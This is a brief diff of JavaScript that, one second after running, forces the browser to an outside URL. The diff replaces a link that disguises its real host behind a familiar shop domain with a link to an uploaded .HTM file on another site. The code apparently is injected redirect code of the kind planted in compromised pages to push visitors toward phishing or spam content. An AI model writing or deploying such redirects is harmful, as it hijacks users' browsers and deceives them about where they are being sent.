@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://shop.10086.cn@xwwebimg-75050.picgzc.qpic.cn/1704546898418.htm' + '?' + timestamp + '%3Cscript';
+    var url = 'https://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM##' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
